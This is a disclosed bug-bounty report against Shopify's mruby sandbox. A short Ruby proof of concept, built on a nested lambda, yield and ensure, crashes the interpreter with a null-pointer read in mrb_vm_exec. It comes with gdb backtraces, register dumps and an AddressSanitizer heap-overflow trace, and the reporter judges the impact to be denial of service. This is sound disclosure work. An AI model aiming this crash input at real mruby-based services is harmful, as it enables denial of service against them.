# SIGSEGV - mrb_vm_exec - line:1681

## Report Details
- **Report ID**: 197693
- **URL**: https://hackerone.com/reports/197693
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-01-12T00:50:11.708Z
- **Disclosed**: 2017-03-09T01:24:07.567Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC:
-------------------

The following code triggers the bug (attached as test_mrb_vm_exec_1681.rb):

	def try
	yield
	ensure
	yield end
	a=lambda do 
	  a.try do
	return end end.call

Mirb - Debug:
-------------------

	(gdb) r test_mrb_vm_exec_1678.rb 
	The program being debugged has been started already.
	Start it from the beginning? (y or n) y
	Starting program: /home/x/Desktop/research/test_2/mruby/bin/mirb test_mrb_vm_exec_1678.rb
	mirb - Embeddable Interactive Ruby Shell

	 => :try

	Program received signal SIGSEGV, Segmentation fault.
	0x00000000004291ef in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71b2d0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681
	1681	        irep = proc->body.irep;
	(gdb) info reg
	rax            0x0	0
	rbx            0x6b9520	7050528
	rcx            0x722990	7481744
	rdx            0x6bfe20	7077408
	rsi            0x6b4710	7030544
	rdi            0x6ad010	7000080
	rbp            0x7fffffffca40	0x7fffffffca40
	rsp            0x7fffffffc4c0	0x7fffffffc4c0
	r8             0x0	0
	r9             0x7ffff7acd7b8	140737348687800
	r10            0x7ffff784ff40	140737346076480
	r11            0x7ffff7895701	140737346361089
	r12            0x401ca0	4201632
	r13            0x7fffffffe040	140737488347200
	r14            0x0	0
	r15            0x0	0
	rip            0x4291ef	0x4291ef <mrb_vm_exec+15826>
	eflags         0x10217	[ CF PF AF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	1676	          return v;
	1677	        }
	1678	        pc = ci->pc;
	1679	        DEBUG(printf("from :%s\n", mrb_sym2name(mrb, ci->mid)));
	1680	        proc = mrb->c->ci->proc;
	1681	        irep = proc->body.irep;
	1682	        pool = irep->pool;
	1683	        syms = irep->syms;
	1684	
	1685	        regs[acc] = v;
	
Backtrace:
-------------------

	(gdb) bt
	#0  0x00000000004291ef in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71b2d0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681
	#1  0x000000000042541b in mrb_vm_run (mrb=0x6ad010, proc=0x6b0150, self=..., stack_keep=1) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772
	#2  0x0000000000402b90 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549
	
Clang - mirb
-------------------

	x@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mirb test_mrb_vm_exec_1681.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => :try
	=================================================================
	==2436==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61e00000f050 at pc 0x0000005ea33f bp 0x7fffe44295f0 sp 0x7fffe44295e8
	READ of size 4 at 0x61e00000f050 thread T0
		#0 0x5ea33e in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1663:38
		#1 0x5d2fbb in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10
		#2 0x4f3ee8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18
		#3 0x7fe077a43ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#4 0x41a585 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a585)

Mruby - Debug:
-------------------
	
	x@x:~/Desktop/research/test_2/mruby/bin$ gdb -q ./mruby
	Reading symbols from ./mruby...done.
	(gdb) r test_mrb_vm_exec_1678.rb 
	Starting program: /home/x/Desktop/research/test_2/mruby/bin/mruby test_mrb_vm_exec_1678.rb

	Program received signal SIGSEGV, Segmentation fault.
	0x000000000042707c in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71520c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681
	1681	        irep = proc->body.irep;
	(gdb) info reg
	rax            0x0	0
	rbx            0x6b9520	7050528
	rcx            0x70d380	7394176
	rdx            0x6bfe20	7077408
	rsi            0x6b4710	7030544
	rdi            0x6ad010	7000080
	rbp            0x7fffffffdb70	0x7fffffffdb70
	rsp            0x7fffffffd5f0	0x7fffffffd5f0
	r8             0x0	0
	r9             0x7ffff7acd7b8	140737348687800
	r10            0x7ffff7acd7b8	140737348687800
	r11            0x7ffff7895701	140737346361089
	r12            0x401b20	4201248
	r13            0x7fffffffe040	140737488347200
	r14            0x0	0
	r15            0x0	0
	rip            0x42707c	0x42707c <mrb_vm_exec+15826>
	eflags         0x10217	[ CF PF AF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	1676	          return v;
	1677	        }
	1678	        pc = ci->pc;
	1679	        DEBUG(printf("from :%s\n", mrb_sym2name(mrb, ci->mid)));
	1680	        proc = mrb->c->ci->proc;
	1681	        irep = proc->body.irep;
	1682	        pool = irep->pool;
	1683	        syms = irep->syms;
	1684	
	1685	        regs[acc] = v;


Backtrace:
-------------------

	(gdb) bt
	#0  0x000000000042707c in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71520c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681
	#1  0x00000000004232a8 in mrb_vm_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772
	#2  0x000000000042b2bc in mrb_top_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:2490
	#3  0x0000000000445cca in mrb_load_exec (mrb=0x6ad010, p=0x709480, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5755
	#4  0x0000000000445d60 in mrb_load_file_cxt (mrb=0x6ad010, f=0x709080, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5764
	#5  0x00000000004024f8 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232


Clang - mruby
-------------------

	x@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mruby test_mrb_vm_exec_1681.rb 
	=================================================================
	==2434==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61e00000f050 at pc 0x0000005e3e0f bp 0x7fff596043b0 sp 0x7fff596043a8
	READ of size 4 at 0x61e00000f050 thread T0
		#0 0x5e3e0e in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1663:38
		#1 0x5cca8b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10
		#2 0x5ffa48 in mrb_top_run /home/x/Desktop/research/clang/mruby/src/vm.c:2490:12
		#3 0x66fe49 in mrb_load_exec /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7
		#4 0x670965 in mrb_load_file_cxt /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10
		#5 0x4f3ad5 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
		#6 0x7f3c733e1ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#7 0x41a4e5 in _start (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a4e5)

Sandbox
-------------------

Attached as sandbox.log.

	x@x:~/Desktop/research/test_2/mruby-engine/bin$ ./sandbox test_mrb_vm_exec_1678.rb 
	./sandbox:20: [BUG] Segmentation fault at 0x00000000000018
	ruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]

	-- Control frame information -----------------------------------------------
	c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
	c:0002 p:0186 s:0005 E:0002b8 EVAL   ./sandbox:20 [FINISH]
	c:0001 p:0000 s:0002 E:0000a0 TOP    [FINISH]

	-- Ruby level backtrace information ----------------------------------------
	./sandbox:20:in `<main>'
	./sandbox:20:in `sandbox_eval'

	-- Machine register context ------------------------------------------------
	 RIP: 0x00007f35da30b310 RBP: 0x00007f35d8e84f80 RSP: 0x00007f35d8e709e0
	 RAX: 0x00007f35d8e84b20 RBX: 0x0000000000000000 RCX: 0x0000000000000000
	 RDX: 0x0000000000000002 RDI: 0x00007f35d8e724e0 RSI: 0x00007f35d8ed1bac
	  R8: 0x00007f35d8e84b20  R9: 0x0000000000000002 R10: 0x0000000000000074
	 R11: 0x0000000000000000 R12: 0x0000000000000000 R13: 0x00007f35d8e724e0
	 R14: 0x0000000000000000 R15: 0x0000000000000000 EFL: 0x0000000000010217

	-- C level backtrace information -------------------------------------------
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de9eed55]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de9eef8c]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de8cb06b]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de98114e]
	/lib/x86_64-linux-gnu/libc.so.6 [0x7f35de4cbff0]
	/home/x/Desktop/research/test_2/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0xae0) [0x7f35da30b310] /home/x/Desktop/research/test_2/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1680
	/home/x/Desktop/research/test_2/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x5c) [0x7f35da3112ec] /home/x/Desktop/research/test_2/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772
	/home/x/Desktop/research/test_2/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0xbe) [0x7f35da2e4f0e] ../../../../ext/mruby_engine/eval_monitored.c:68
	/lib/x86_64-linux-gnu/libpthread.so.0(start_thread+0xc2) [0x7f35de27f182] pthread_create.c:312
	/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f35de59030d] ../sysdeps/unix/sysv/linux/x86_64/clone.S:111
	...
	...
	...
	7f35deefc000-7f35deefd000 rw-p 00023000 08:01 397412                     /lib/x86_64-linux-gnu/ld-2.19.so
	7f35deefd000-7f35deefe000 rw-p 00000000 00:00 0 
	7fffc731d000-7fffc7b1c000 rw-p 00000000 00:00 0                          [stack]
	7fffc7bfe000-7fffc7c00000 r-xp 00000000 00:00 0                          [vdso]
	ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]


	[NOTE]
	You may have encountered a bug in the Ruby interpreter or extension libraries.
	Bug reports are welcome.
	For details: http://www.ruby-lang.org/bugreport.html

	Aborted (core dumped)

Impact
-------------------

As far as I can see, it is not exploitable. But it can cause DoS.

## Attachments
- test_mrb_vm_exec_1681.rb
- sandbox.log
